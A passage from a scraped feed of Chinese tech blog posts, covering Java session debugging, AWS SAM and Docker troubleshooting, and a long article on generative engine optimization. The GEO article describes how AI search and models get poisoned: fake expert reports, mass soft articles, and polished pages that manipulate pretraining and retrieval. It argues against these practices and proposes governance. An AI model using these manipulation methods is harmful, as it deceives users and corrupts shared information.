logger.info(\"请求进入: URI=\" + req.getRequestURI() + \n                   \", SessionID=\" + sessionId + \n                   \", Session是否有效=\" + sessionValid);\n\n        chain.doFilter(request, response);\n\n        // 请求处理后，再次检查Session状态\n        sessionValid = req.isRequestedSessionIdValid();\n        logger.info(\"请求离开: URI=\" + req.getRequestURI() + \n                   \", Session是否有效=\" + sessionValid);\n    }\n}</code></pre>\n<p>部署这些监听器和过滤器后，重现闪退问题。然后立即查看服务器日志，寻找 <code class=\"hyc-common-markdown__code__inline\">！！！ Session被销毁</code>这条关键日志。它会告诉你Session被销毁的精确时间，结合堆栈信息，就能定位到是哪个代码路径或配置触发了销毁。</p>\n<p>二、分析服务器线程栈</p>\n<p>如果怀疑是<strong>会话锁超时</strong>，需要在闪退发生时，立刻获取服务器的线程堆栈快照（<code class=\"hyc-common-markdown__code__inline\">jstack &lt;pid&gt;</code>）。分析快照，看是否有线程长时间持有Session锁（状态为 <code class=\"hyc-common-markdown__code__inline\">RUNNABLE</code>且正在执行查询SQL），而其他线程在等待这个锁（状态为 <code class=\"hyc-common-markdown__code__inline\">BLOCKED</code>）。</p>\n<h3>总结：跟踪流程一览表</h3>\n<div class=\"hyc-common-markdown__table-wrapper\">\n<table>\n<thead>\n<tr>\n<th>\n<p>步骤</p>\n</th>\n<th>\n<p>跟踪点</p>\n</th>\n<th>\n<p>方法</p>\n</th>\n<th>\n<p>期望结果</p>\n</th>\n<th>\n<p>异常结果与含义</p>\n</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>\n<p><strong>1</strong>​</p>\n</td>\n<td>\n<p><strong>浏览器接收Cookie</strong>​</p>\n</td>\n<td>\n<p>F12 -&gt; Network -&gt; 查看登录请求的 <code class=\"hyc-common-markdown__code__inline\">Set-Cookie</code>响应头</p>\n</td>\n<td>\n<p>收到正确的 <code class=\"hyc-common-markdown__code__inline\">JSESSIONID</code></p>\n</td>\n<td>\n<p>未收到：服务器响应问题</p>\n</td>\n</tr>\n<tr>\n<td>\n<p><strong>2</strong>​</p>\n</td>\n<td>\n<p><strong>浏览器存储Cookie</strong>​</p>\n</td>\n<td>\n<p>F12 -&gt; Application -&gt; Cookies</p>\n</td>\n<td>\n<p>存储了正确的 <code class=\"hyc-common-markdown__code__inline\">JSESSIONID</code></p>\n</td>\n<td>\n<p>未存储：浏览器安全策略阻止</p>\n</td>\n</tr>\n<tr>\n<td>\n<p><strong>3</strong>​</p>\n</td>\n<td>\n<p><strong>后续请求携带Cookie</strong>​</p>\n</td>\n<td>\n<p>F12 -&gt; Network -&gt; 查看查询请求的 <code class=\"hyc-common-markdown__code__inline\">Cookie</code>请求头</p>\n</td>\n<td>\n<p>携带了登录时的 <code class=\"hyc-common-markdown__code__inline\">JSESSIONID</code></p>\n</td>\n<td>\n<p>未携带/值错误：浏览器端Cookie丢失</p>\n</td>\n</tr>\n<tr>\n<td>\n<p><strong>4</strong>​</p>\n</td>\n<td>\n<p><strong>服务器处理请求</strong>​</p>\n</td>\n<td>\n<p>查看服务器日志/监听器日志</p>\n</td>\n<td>\n<p>Session有效，请求正常处理</p>\n</td>\n<td>\n<p>日志显示Session被销毁：服务器端主动废弃会话</p>\n</td>\n</tr>\n<tr>\n<td>\n<p><strong>5</strong>​</p>\n</td>\n<td>\n<p><strong>服务器并发情况</strong>​</p>\n</td>\n<td>\n<p>分析线程堆栈快照 (<code class=\"hyc-common-markdown__code__inline\">jstack</code>)</p>\n</td>\n<td>\n<p>无长时间锁等待</p>\n</td>\n<td>\n<p>有线程因等待Session锁而阻塞：会话锁超时问题</p>\n</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>请按照这个流程进行操作，很大概率能直接定位到问题发生的具体环节。先从<strong>浏览器端跟踪</strong>开始，这通常能给出最直接的线索。</p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 15:22</span>&nbsp;\n<a href=\"https://www.cnblogs.com/liuyangjava\">子墨老师</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "2026 年 AI 搜索进入商业化：GEO 从“抢答案”走向“信任治理” （从新华社/央视调查到概念股热潮：为什么“可持续 GEO”必须以反数据污染为前提）",
      "link": "https://www.cnblogs.com/GrowUME/p/19506897",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/GrowUME/p/19506897\" id=\"cb_post_title_url\" title=\"发布于 2026-01-20 15:08\">\n    <span>2026 年 AI 搜索进入商业化：GEO 从“抢答案”走向“信任治理” （从新华社/央视调查到概念股热潮：为什么“可持续 GEO”必须以反数据污染为前提）</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"结论\">结论</h2>\n<p>AI 搜索正在把“链接列表”改写为“答案层”，GEO（生成式引擎优化）因此从营销选修课变成品牌增长的基础设施；但新华社与央视的调查同时提醒：当下不少“GEO服务”正以暗广、伪造权威、系统化投喂等方式影响 AI 推荐，实质接近“数据污染”，会引发信任、合规与生态风险。<br />\n资本市场对“GEO 概念股”的追捧反映了入口迁移的想象空间，但多家上市公司公告也明确提示：不少相关业务尚未形成成熟盈利模式、甚至未形成收入，行业仍处早期探索期。<br />\n可持续的 GEO 不是“让 AI 夸你”，而是“让 AI 在引用你时说对、说全、说得可核查”：用事实底座、证据链、结构化表达与治理机制，把增长做成长期资产，而不是一场“数据污染事故”。</p>\n<h2 id=\"key-takeaways\">Key Takeaways</h2>\n<ul>\n<li><strong>GEO 的核心战场是“答案层引用权”</strong>：被提及/被引用正在替代被点击，成为新的可见性指标。</li>\n<li><strong>“黑帽 GEO”正在显性化为数据污染</strong>：海量同质软文、假报告/假专家、暗广无标识，会直接破坏信息生态与用户信任。</li>\n<li><strong>AI 推荐/搜索的商业化必须可识别</strong>：新华社调查提到 AI 搜索结果可能混入付费信息且缺少“广告”标识，带来消费者误判风险。</li>\n<li><strong>AI 对“结构清晰、可抓取”的内容存在偏好</strong>：央视调查显示，AI 引用的信源往往结构规范、标题像“指南/榜单”，这会诱发内容农场式投放。</li>\n<li><strong>行业仍在早期，概念热≠收入稳</strong>：证券时报报道提到多家公司回应 GEO 业务尚未形成收入或盈利模式不确定。</li>\n<li><strong>正确 GEO 要从“内容工程”升级为“可信内容治理”</strong>：建立事实底座、证据链、版本管理、监测与纠错闭环。</li>\n<li><strong>30-60-90 天落地要先“控风险再扩规模”</strong>：先立红线与验收指标，再做内容供给与分发扩张（否则很容易演变为污染）。</li>\n<li><strong>全球也在形成 GEO 工具化与 SaaS 化</strong>：有创业公司以“模拟品牌在 AI 回复中的呈现”来售卖 GEO 能见度与优化服务，说明市场在快速产品化。</li>\n</ul>\n<hr />\n<h2 id=\"1-热点复盘为什么-2026-年初-geo-被推到台前\">1. 热点复盘：为什么 2026 年初 GEO 被推到台前？</h2>\n<h3 id=\"11-用户路径迁移从搜一下到问问-ai\">1.1 用户路径迁移：从“搜一下”到“问问 AI”</h3>\n<p>新华社援引 CNNIC 报告提到：截至 <strong>2025 年 6 月</strong>，我国生成式 AI 用户规模达 <strong>5.15 亿</strong>、普及率 <strong>36.5%</strong>，并已广泛用于智能搜索等场景。入口迁移让“被 AI 选中”具备了可量化价值。</p>\n<h3 id=\"12-商业化迁移答案层正在出现暗广与带货\">1.2 商业化迁移：答案层正在出现“暗广”与“带货”</h3>\n<ul>\n<li>新华社调查指出：AI 搜索同样可能出现“付费信息靠前且无广告标签”的问题，并披露了代运营式 GEO 服务报价（按年收费、价格与“算力/效果”绑定）。</li>\n<li>央视《锋面》调查呈现了更具体的“带货”场景：机构宣称能让品牌在 AI 问答里“立竿见影”提升能见度，并强调需要持续维护数据、稳固“地位”。</li>\n</ul>\n<h3 id=\"13-资本市场迁移geo-概念股热度与未形成收入的现实\">1.3 资本市场迁移：GEO 概念股热度与“未形成收入”的现实</h3>\n<p>证券时报（经济参考报来源）报道提到：易点天下、天龙集团、浙文互联、引力传媒等被市场归类为 GEO 概念标的出现上涨；但多家公司公告回应的核心点是 <strong>“尚未形成收入/盈利模式不确定”</strong>，行业处探索期。</p>\n<hr />\n<h2 id=\"2-生成式搜索的机制geo-到底在优化什么\">2. 生成式搜索的机制：GEO 到底在优化什么？</h2>\n<h3 id=\"21-从-serp-到-answer-layer可见性的计量单位变了\">2.1 从 SERP 到 Answer Layer：可见性的计量单位变了</h3>\n<p>传统 SEO 追求在搜索结果列表中“排第几”；生成式搜索把信息整合成“答案”，并常以角标/引用指向来源网页。新华社文章就提到 AI 搜索结果后有数字角标可追溯来源，这让“被引用”成为核心可见性形态。</p>\n<p>学术界对这一变化已有明确表述：arXiv/ACM KDD 的 GEO 研究把“生成式引擎”定义为用大模型综合多源信息生成答案的系统，并提出内容方需要围绕“在生成式回答中被呈现/被引用”建立新的优化与度量框架。</p>\n<h3 id=\"22-影响路径的两大入口预训练语料与实时检索\">2.2 影响路径的两大“入口”：预训练语料与实时检索</h3>\n<p>央视调查引用专家观点指出：恶意 GEO 主要针对两环节——</p>\n<ol>\n<li><strong>预训练数据阶段</strong>：试图将带有品牌偏见的信息“喂”给模型，形成训练污染；</li>\n<li><strong>实时检索阶段</strong>：制作看似权威、中立、格式规范的页面，更容易被 AI 采纳。</li>\n</ol>\n<blockquote>\n<p>对应到策略上：<strong>GEO 不是“做更多内容”，而是“做更可被验证、可被机器稳定读取的内容”，并确保这些内容出现在 AI 更愿意信任的信源体系里。</strong></p>\n</blockquote>\n<h3 id=\"23-seo-vs-geo同源但不是同题建议用这张对比表对齐团队共识\">2.3 SEO vs GEO：同源但不是同题（建议用这张对比表对齐团队共识）</h3>\n<table>\n<thead>\n<tr>\n<th>维度</th>\n<th>SEO（搜索引擎优化）</th>\n<th>GEO（生成式引擎优化）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>目标</td>\n<td>排名、点击、转化</td>\n<td>被提及、被引用、被准确复述、带来行动</td>\n</tr>\n<tr>\n<td>主要输出位</td>\n<td>SERP 列表</td>\n<td>Answer Layer（摘要/对话答案/推荐）</td>\n</tr>\n<tr>\n<td>优化对象</td>\n<td>页面、关键词、链接</td>\n<td>实体（品牌/产品）、主张（claims）、证据链、信源结构</td>\n</tr>\n<tr>\n<td>关键资产</td>\n<td>可抓取性、链接权重、页面体验</td>\n<td>事实底座、结构化表达、权威第三方背书、可追溯引用</td>\n</tr>\n<tr>\n<td>主要风险</td>\n<td>黑帽降权</td>\n<td>数据污染、暗广合规、品牌事实被 AI 说错/说偏</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<h2 id=\"3-误区与风险geo-为什么容易滑向数据污染\">3. 误区与风险：GEO 为什么容易滑向“数据污染”？</h2>\n<h3 id=\"31-两类典型污染型打法\">3.1 两类典型“污染型打法”</h3>\n<p><strong>（A）海量同质内容投放 → 概率式被抓取</strong><br />\n新华社调查指出，市面上一些所谓 GEO 本质是代理机构通过海量投放软文，靠概率被大模型抓取；并提示“定向投放重复无用内容”属于数据污染。</p>\n<p><strong>（B）伪造权威信号 → 假报告/假专家/假背书</strong><br />\n新华社与央视都提到：存在编造“权威报告”、虚构专家身份、仿冒白皮书等手法，目的是提高 AI 对内容可信度的误判概率。</p>\n<h3 id=\"32-为什么这比黑帽-seo更危险\">3.2 为什么这比“黑帽 SEO”更危险？</h3>\n<ul>\n<li><strong>污染具有延续性</strong>：央视指出，被污染的生成内容可能成为后续训练数据源，形成“污染遗留效应”。</li>\n<li><strong>识别与取证更难</strong>：央视强调其商业意图更隐蔽，执法面临“显性特征不突出、主观意图难证明、因果链拉长”等困境。</li>\n<li><strong>对模型的影响可能“小样本大后果”</strong>：央视引用研究观点称，少量精心设计的污染数据也可能造成模型认知偏差，并引发“回声室效应”。</li>\n</ul>\n<h3 id=\"33-合规底线正在收紧广告识别--生成内容标识\">3.3 合规底线正在收紧：广告识别 + 生成内容标识</h3>\n<ul>\n<li>新华社文章直接援引广告法精神：广告应具可识别性、应显著标明“广告”，以避免消费者误解，并建议在生成式结果中明确加注“广告”。</li>\n<li>国家网信办等部门发布的《生成式人工智能服务管理暂行办法》明确要求不得生成法律法规禁止内容，并强调提升透明度与生成内容准确性。</li>\n<li>《人工智能生成合成内容标识办法》已明确自 <strong>2025 年 9 月 1 日</strong> 起施行，强化对生成合成内容的标识要求；路透也报道了中国将要求对 AI 生成内容进行标注的监管动向。</li>\n</ul>\n<blockquote>\n<p>结论：<strong>如果你的 GEO 依赖“用户看不出来的商业操控”，它迟早会在合规与平台治理中被清算</strong>；并且会反噬品牌信任资产。</p>\n</blockquote>\n<hr />\n<h2 id=\"4-可持续-geo-的新范式把增长做成可信内容工程\">4. 可持续 GEO 的新范式：把“增长”做成“可信内容工程”</h2>\n<h3 id=\"41-三条原则建议作为团队红线写进-sop\">4.1 三条原则（建议作为团队红线写进 SOP）</h3>\n<ol>\n<li><strong>可核查（Verifiable）</strong>：每个关键主张都能追溯到来源、时间、口径与责任人。</li>\n<li><strong>可机器读取（Machine-scannable）</strong>：结构清晰、信息密度高、可被引用的段落化表达，而不是堆砌。</li>\n<li><strong>可持续纠错（Correctable）</strong>：允许被 AI/用户质疑，能快速更新、发布勘误并形成版本记录。</li>\n</ol>\n<h3 id=\"42-先建事实底座再谈内容分发\">4.2 先建“事实底座”，再谈“内容分发”</h3>\n<p>你要优化的不是“文章数量”，而是 AI 在回答时能稳定引用的“事实对象”。建议把品牌/产品信息拆成三层资产：</p>\n<ul>\n<li>\n<p><strong>L0：口径层（Single Source of Truth）</strong></p>\n<ul>\n<li>产品规格、价格/政策、服务范围、适用/不适用边界</li>\n<li>关键定义、对比维度、测试方法</li>\n</ul>\n</li>\n<li>\n<p><strong>L1：证据层（Evidence Layer）</strong></p>\n<ul>\n<li>可公开验证的数据、第三方测评、标准/法规依据</li>\n<li>案例（可核验）、引用（可追溯）</li>\n</ul>\n</li>\n<li>\n<p><strong>L2：表达层（Presentation Layer）</strong></p>\n<ul>\n<li>FAQ、How-to、对比表、清单式结论、更新日志</li>\n</ul>\n</li>\n</ul>\n<p>学术研究对“引用/统计/引述”对可见性的提升也给出方向：GEO 研究提出，在生成式回答中加入引用、相关引述、统计信息等方法能显著提升内容在生成式引擎中的可见性，并提出了面向生成式引擎的专门度量与基准。</p>\n<h3 id=\"43-权威第三方信源会越来越重要earned-media-优先\">4.3 “权威第三方信源”会越来越重要（Earned media 优先）</h3>\n<p>2025 年的 AI Search 实证研究指出：生成式搜索相对更偏向 <strong>第三方权威来源（earned media）</strong>，而不是品牌自有或社媒内容，并且不同引擎在新鲜度、域多样性、措辞敏感度上差异很大。</p>\n<p>这与国内调查呈现的现象互相印证：当“内容能被 AI 采信”成为竞争点，伪造权威的诱因上升，同时也说明<strong>真正长期有效的路径，是获得真实权威背书，而不是伪造背书</strong>。</p>\n<hr />\n<h2 id=\"5-别把增长做成数据污染事故6-层防线可直接抄进制度\">5. “别把增长做成数据污染事故”：6 层防线（可直接抄进制度）</h2>\n<blockquote>\n<p>目标：把 GEO 从“内容投放动作”升级为“可审计、可验收、可追责”的增长系统。</p>\n</blockquote>\n<h3 id=\"防线-1战略与合规闸门policy-gate\">防线 1：战略与合规闸门（Policy Gate）</h3>\n<ul>\n<li><strong>红线</strong>：不做暗广无标识、不伪造机构/专家/报告、不制造同质垃圾。</li>\n<li><strong>机制</strong>：供应商合同写入“虚假背书/黑帽投喂”违约条款；所有商业合作内容统一披露与标识策略（对齐广告识别要求）。</li>\n</ul>\n<h3 id=\"防线-2事实底座与口径管理ssot--versioning\">防线 2：事实底座与口径管理（SSOT + Versioning）</h3>\n<ul>\n<li>单一事实源（产品/政策/参数/定价/免责声明），带版本号与生效时间</li>\n<li>建立“口径变更 → 内容更新 → 监测复测”的流水线</li>\n<li>高风险行业（医、金、教）建立“法务一票否决”机制（建议）</li>\n</ul>\n<h3 id=\"防线-3内容生产与审校claimevidence-qa\">防线 3：内容生产与审校（Claim–Evidence QA）</h3>\n<ul>\n<li><strong>每篇内容必须有“主张—证据”映射表</strong>（至少对核心结论做）</li>\n<li>反同质：禁止模板化批量生成后分发；对“榜单/指南”类内容设置更严格审查（央视调查显示其更易被引用）。</li>\n</ul>\n<h3 id=\"防线-4分发与渠道治理channel-governance\">防线 4：分发与渠道治理（Channel Governance）</h3>\n<ul>\n<li>白名单渠道 + 频控；禁止“全网一键群发”式操作</li>\n<li>对 KOL/UGC 合作建立披露规范与内容留档（便于取证与纠错）</li>\n</ul>\n<h3 id=\"防线-5监测与评估llm-visibility--accuracy-monitoring\">防线 5：监测与评估（LLM Visibility &amp; Accuracy Monitoring）</h3>\n<p>建议建立 4 组核心指标（比 CTR 更贴近 AI 搜索）：</p>\n<ol>\n<li><strong>提及率（Mention Rate）</strong>：目标问题集里出现品牌/产品的比例</li>\n<li><strong>引用率（Citation Rate）</strong>：是否给出可追溯来源、来源是否为你想要的权威信源</li>\n<li><strong>准确率（Factual Accuracy）</strong>：AI 对关键事实是否说对（参数、价格、范围、限制条件）</li>\n<li><strong>合规风险率（Compliance Flags）</strong>：是否出现暗示性夸大、医疗/金融不当承诺、未标识推广等</li>\n</ol>\n<p>央视调查提示“联网/不联网”可能导致答案差异，说明监测必须覆盖不同模式与引擎。</p>\n<h3 id=\"防线-6纠错与应急remediation--incident-response\">防线 6：纠错与应急（Remediation &amp; Incident Response）</h3>\n<ul>\n<li>建立“错误答案工单”：截图/时间/平台/触发问题/错误点/正确口径/证据</li>\n<li>快速动作：发布勘误、更新权威页面、必要时要求渠道下架虚假内容</li>\n<li>行业协同：新华社建议共享炮制虚假内容的黑名单思路，可转化为企业间/平台间的反作弊协作。</li>\n</ul>\n<hr />\n<h2 id=\"6-30-60-90-天落地-sop可验收版本\">6. 30-60-90 天落地 SOP（可验收版本）</h2>\n<blockquote>\n<p>你要的是“可验证的推进”，不是“内容越多越好”。</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th>阶段</th>\n<th>目标</th>\n<th>关键产出（Deliverables）</th>\n<th>验收指标（建议）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>0–30 天</strong></td>\n<td>建底座、立红线、打点监测</td>\n<td>① 关键实体清单（品牌/产品/场景/竞品）② SSOT 口径库 v1 ③ 目标问题集（50–200 条）④ 监测看板 v1 ⑤ 供应商合规条款模板</td>\n<td>基线：各引擎 Mention/Citation/Accuracy 的现状值；高风险内容清理清单完成</td>\n</tr>\n<tr>\n<td><strong>31–60 天</strong></td>\n<td>形成“可被引用”的核心内容矩阵</td>\n<td>① 核心内容模板（定义/对比/FAQ/How-to/边界条件）② 证据库（第三方报告/标准/案例）③ 结构化标记与页面可抓取优化</td>\n<td>Citation Rate 提升；Accuracy 明显改善；核心问题集 Top3 提及率提升</td>\n</tr>\n<tr>\n<td><strong>61–90 天</strong></td>\n<td>扩规模但不扩污染：渠道化、产品化、复用化</td>\n<td>① 内容集群（Topic Cluster）② Earned media 计划（真实背书）③ 纠错SLA（48/72小时）④ 月度复测与漂移报告</td>\n<td>稳定增长：提及率曲线向上且合规风险不升；纠错闭环时效达标</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<h2 id=\"7-geo-概念股与产业链怎么看热度怎么做预算\">7. GEO 概念股与产业链：怎么看“热度”，怎么做“预算”？</h2>\n<h3 id=\"71-产业链拆解用来对齐采购与合作方\">7.1 产业链拆解（用来对齐采购与合作方）</h3>\n<ul>\n<li><strong>平台层</strong>：对话式 AI、AI 搜索、Agent 推荐入口</li>\n<li><strong>内容与信源层</strong>：媒体/出版机构/权威数据库/行业协会/测评机构</li>\n<li><strong>工具层</strong>：监测（提及/引用/准确率）、内容工程、知识库与版本管理</li>\n<li><strong>服务层</strong>：咨询/代运营/内容生产/公关与背书整合</li>\n<li><strong>治理层</strong>：合规标识、反作弊、内容审校与证据链审计</li>\n</ul>\n<p>全球市场也在工具化：例如 Business Insider 报道的 Azoma 以“数字孪生”模拟品牌在 AI 回复中的呈现，并售卖“可见度评估+内容优化”。这类产品形态意味着：<strong>GEO 会从项目制走向长期订阅与监测</strong>。</p>\n<h3 id=\"72-看概念股更要看可验收收入路径\">7.2 看概念股更要看“可验收收入路径”</h3>\n<p>证券时报报道的关键启示是：市场热度高，但不少上市公司公告提示 GEO 业务尚未形成成熟盈利模式或尚未形成收入。</p>\n<p><strong>对品牌方预算的落点</strong>：</p>\n<ul>\n<li>不要按“发稿量/覆盖平台数”采购；</li>\n<li>要按“目标问题集的 Mention/Citation/Accuracy 提升 + 合规风险率下降 + 可追溯证据链完善度”采购；</li>\n<li>合同写入“虚假背书/暗广无标识/批量同质内容”一票否决与罚则（否则你是在外包风险）。</li>\n</ul>\n<hr />\n<h2 id=\"证据与边界\">证据与边界</h2>\n<h3 id=\"关键证据\">关键证据</h3>\n<ul>\n<li><strong>AI 搜索结果可能混入付费信息且无广告标签、GEO 服务报价、以及假报告/假专家/数据污染案例</strong>：新华社调查。</li>\n<li><strong>GEO 的两类技术切入点（预训练/实时检索）、“带货”式机构承诺、以及回声室与小样本污染风险</strong>：央视《锋面》调查。</li>\n<li><strong>概念股热度与上市公司“未形成收入/盈利不确定”回应</strong>：证券时报（经济参考报来源）。</li>\n<li><strong>监管方向：生成式 AI 管理办法、生成合成内容标识办法与相关报道</strong>：国家网信办与路透报道。</li>\n<li><strong>学术依据：GEO 作为新范式、可见性度量与方法有效性（可见性提升）</strong>：arXiv/ACM KDD GEO 研究。</li>\n</ul>\n<h3 id=\"边界与待核查\">边界与待核查</h3>\n<ul>\n<li>市场上流传的“某白皮书转化提升倍数/规模预测”类数据，<strong>建议一律视为“媒体/研报引用”而非可直接当作事实</strong>；若要使用，需拿到原始报告、明确发布机构、样本方法与适用行业。</li>\n<li>各家 AI 搜索/助手的抓取与引用机制差异大（是否联网、是否有检索增强、引用偏好等），因此 <strong>GEO 不能“一套打法通吃所有引擎”</strong>；建议用你自己的“目标问题集”做持续复测。</li>\n</ul>\n<hr />\n<h2 id=\"faq6\">FAQ（≥6）</h2>\n<ol>\n<li>\n<p><strong>GEO 和 SEO 是替代关系吗？</strong><br />\n不是替代，是入口层级变化：SEO 保障可抓取与基础权重，GEO 面向答案层的“被引用/被准确复述”。</p>\n</li>\n<li>\n<p><strong>为什么现在 GEO 容易变成“数据污染”？</strong><br />\n因为 AI 偏好结构化、可抓取内容，投机者用海量同质内容与伪权威信号提高被采纳概率，破坏信任与生态。</p>\n</li>\n<li>\n<p><strong>怎么判断一家 GEO 服务商是否“黑帽”？</strong><br />\n如果其承诺“立竿见影”“保证第一”“可提供伪背书/伪权威素材”，或交付物本质是批量软文分发与伪造权威，就应判定高风险。</p>\n</li>\n<li>\n<p><strong>AI 推荐里出现商业信息，一定违法吗？</strong><br />\n关键在于是否构成广告、是否可识别、是否误导，以及是否符合生成式 AI 与内容标识要求；新闻调查指出“未声明商业意图”的灰色地带正在成为治理重点。</p>\n</li>\n<li>\n<p><strong>GEO 的第一指标是什么？</strong><br />\n建议不是“提及率”单指标，而是组合：提及率 + 引用率 + 事实准确率 + 合规风险率（否则容易把增长做成风险）。</p>\n</li>\n<li>\n<p><strong>内容怎么更容易被 AI 引用？</strong><br />\n学术研究与调查都指向同一个方向：结构清晰、信息密度高、可追溯引用/统计/证据链完善，更容易在生成式回答中获得可见性。</p>\n</li>\n<li>\n<p><strong>“概念股”热度对品牌方有什么启示？</strong><br />\n启示不是追热点，而是：行业早期、机制未定、供应商鱼龙混杂；预算必须以可验收指标与合规条款来控风险。</p>\n</li>\n</ol>\n<h2 id=\"术语定义\">术语定义</h2>\n<ul>\n<li><strong>GEO（Generative Engine Optimization）</strong>：面向生成式引擎/AI 搜索的内容可见性优化，目标是提升在 AI 生成答案中的呈现、引用与影响力。</li>\n<li><strong>Answer Layer（答案层）</strong>：AI 将多源信息整合为直接答案的呈现层，常带引用角标。</li>\n<li><strong>RAG（检索增强生成）</strong>：通过检索外部信息源增强生成答案的方式（影响引用与新鲜度）。</li>\n<li><strong>数据污染（Data Pollution/Poisoning）</strong>：向训练/检索可见的语料环境注入重复、无用或带偏见内容，导致模型输出偏差与信任下降。</li>\n<li><strong>暗广（Undisclosed Promotion）</strong>：未清晰标识商业推广意图、但影响用户决策的内容形态。</li>\n<li><strong>Earned Media（第三方背书信源）</strong>：非品牌自有渠道产生的权威提及/报道/评测，AI 搜索可能更偏好此类来源。</li>\n</ul>\n<h2 id=\"关键实体清单\">关键实体清单</h2>\n<ul>\n<li><strong>媒体与调查来源</strong>：新华社、新华网、央视网《锋面》、证券时报（经济参考报来源）。</li>\n<li><strong>监管与规则</strong>：国家网信办《生成式人工智能服务管理暂行办法》；《人工智能生成合成内容标识办法》。</li>\n<li><strong>作者/方法论实践者</strong>：张海刚（Hager）｜AI 搜索增长专家（GEO &amp; SEO）｜数智化营销专家（技术+策略+内容）；第十七届（2025-2026）虎啸奖评审团评委。</li>\n<li><strong>资本市场相关公司</strong>：易点天下、天龙集团、浙文互联、引力传媒、人民网、浙数文化、新华网等。</li>\n<li><strong>学术研究</strong>：GEO: Generative Engine Optimization（KDD 2024 / arXiv）；Generative Engine Optimization: How to Dominate AI Search（arXiv 2025）。</li>\n</ul>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 15:08</span>&nbsp;\n<a href=\"https://www.cnblogs.com/GrowUME\">友觅UME</a>&nbsp;\n阅读(<span id=\"post_view_count\">27</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Docker 升级后 VS Code 本地调试 AWS Lambda 报「Running AWS SAM projects locally requires Docker」的那些坑与排查思路",
      "link": "https://www.cnblogs.com/wanghaiwei/p/19505845",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/wanghaiwei/p/19505845\" id=\"cb_post_title_url\" title=\"发布于 2026-01-20 11:48\">\n    <span>Docker 升级后 VS Code 本地调试 AWS Lambda 报「Running AWS SAM projects locally requires Docker」的那些坑与排查思路</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"一问题场景描述\">一、问题场景描述</h2>\n<ul>\n<li>\n<p>在 VS Code 中使用 AWS Toolkit 本地调试 Lambda（基于 AWS SAM 项目）时，点击本地运行/调试，出现提示：<br />\n“Running AWS SAM projects locally requires Docker. Have you got it installed and running?”</p>\n</li>\n<li>\n<p>实际情况是：本地已经安装并运行 Docker Desktop，使用命令行执行&nbsp;<code>docker ps</code>、<code>docker info</code>&nbsp;等都正常，容器环境可用。[<a href=\"https://stackoverflow.com/questions/50791354/running-aws-sam-projects-locally-get-error\" rel=\"noopener nofollow\" target=\"_blank\">stackoverflow</a>]​</p>\n</li>\n<li>\n<p>换句话说：<strong>Docker 明明在跑，但 VS Code + SAM CLI 坚持说“找不到 Docker”</strong>。[<a href=\"https://stackoverflow.com/questions/50791354/running-aws-sam-projects-locally-get-error\" rel=\"noopener nofollow\" target=\"_blank\">stackoverflow</a>]​</p>\n</li>\n</ul>\n<hr />\n<h2 id=\"二最终确认的根因你这次遇到的\">二、最终确认的根因（你这次遇到的）</h2>\n<ul>\n<li>\n<p>你找到的最终原因是：<strong>在升级 Docker Desktop 之后，本地的 AWS SAM CLI 以及关系紧密的 AWS 工具链（如 VS Code 插件）版本没有同步升级，导致与新 Docker 版本的 API/行为不兼容</strong>。[<a href=\"https://stackoverflow.com/questions/50791354/running-aws-sam-projects-locally-get-error\" rel=\"noopener nofollow\" target=\"_blank\">stackoverflow</a>]​</p>\n</li>\n<li>\n<p>升级 AWS SAM CLI 和 AWS 相关插件到最新版本后，错误提示消失，本地调试恢复正常。[<a href=\"https://stackoverflow.com/questions/50791354/running-aws-sam-projects-locally-get-error\" rel=\"noopener nofollow\" target=\"_blank\">stackoverflow</a>]</p>\n</li>\n<li>\n<p>升级方法：跟着官方文档重新下载安装包，会自动升级：<a href=\"https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/install-sam-cli.html#install-sam-cli-instructions%E2%80%8B\" rel=\"noopener nofollow\" target=\"_blank\">https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/install-sam-cli.html#install-sam-cli-instructions​</a></p>\n</li>\n</ul>\n<p>这一点可以作为你分享里的“主线故事”——“隐形的版本兼容问题”。</p>\n<hr />\n<h2 id=\"三可能的原因总览可用作分享中的-checklist\">三、可能的原因总览（可用作分享中的 checklist）</h2>\n<p>你可以按“从最基础到偏高级”的顺序介绍，帮助听众形成排查思路。</p>\n<h3 id=\"31-docker-本身真的没装--没启动\">3.1 Docker 本身真的没装 / 没启动</h3>\n<p>虽然看起来很基础，但在团队里经常是最真实的情况，可以简要提一下。[<a href=\"https://stackoverflow.com/questions/50791354/running-aws-sam-projects-locally-get-error\" rel=\"noopener nofollow\" target=\"_blank\">stackoverflow</a>]​</p>\n<ul>\n<li>\n<p>未安装 Docker Desktop 或其他 Docker 引擎。</p>\n</li>\n<li>\n<p>Docker Desktop 已安装，但当前没有启动（托盘图标还在 starting / 未 running 状态）。</p>\n</li>\n<li>\n<p>在 VS Code 集成终端中运行&nbsp;<code>docker 